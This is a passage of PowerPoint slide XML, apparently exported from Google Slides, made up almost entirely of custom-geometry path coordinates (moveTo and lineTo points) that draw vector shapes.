                    <a:pt x="8107" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="5429"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1651" y="9757"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1028" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9757"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16324" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16140" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14636" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="1357"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="11591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="11591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14196" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16947" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17168" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17351" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="1247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17388" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17278" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17094" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16837" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1650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0" name="Google Shape;300;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6405225" y="2154575"/>
              <a:ext cx="328325" cy="339325"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="13133" h="13573" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2714" y="1798"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2971" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3411" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2714" y="1798"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1908" y="2825"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1797" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="2825"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1137" y="2311"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1614" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="2311"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8804" y="514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8694" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="514"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="660" y="4145"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="880" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="4145"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3962" y="2935"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4218" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="2935"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4989" y="5209"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5356" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="5209"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4879" y="4695"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4805" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4218" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="4695"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9757" y="9537"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9794" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="9537"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8950" y="8877"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9207" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="8877"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8547" y="9244"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8547" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="9244"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9464" y="10601"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9574" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="10601"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8877" y="8510"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8584" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="9171"/>
                  </a:lnTo>
